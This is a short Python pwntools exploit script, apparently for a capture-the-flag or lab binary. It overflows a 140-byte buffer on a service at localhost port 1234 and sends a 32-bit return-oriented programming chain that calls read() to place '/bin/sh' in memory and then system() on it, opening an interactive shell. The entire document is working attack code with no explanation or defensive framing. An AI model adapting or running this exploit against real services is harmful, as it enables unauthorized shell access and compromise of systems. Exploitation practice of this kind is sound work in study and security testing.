from pwn import *

class RopChain:

    chain = ""

    def addLink(self, addr, cleanup, args):

        RopChain.chain += struct.pack('<II',addr,cleanup)

        if type(args) is list:
            for i in range(0,len(args)):
                RopChain.chain += struct.pack('<I',args[i])
        elif type(args) is int:
            RopChain.chain+= struct.pack('<I',args)

    def getChain(self):
        return RopChain.chain

cmd = "/bin/sh\n"
overflow = "a" * 140

########GADGETS#########
storage = 0x8049530
read_addr= 0x804832c
sys_addr = 0xf7e33eb0
pppr = 0x80484b6
junk = 0xdeadbeef
#######################

conn = remote('localhost', 1234)

ropChain = RopChain();
ropChain.addLink(read_addr,pppr,[0,storage,len(cmd)])
ropChain.addLink(sys_addr,junk,storage)



payload = overflow + ropChain.getChain()

print "sending payload..."
conn.sendline(payload)
print "writing command to memory..."
conn.sendline(cmd)
print "getting shell..."
conn.interactive()
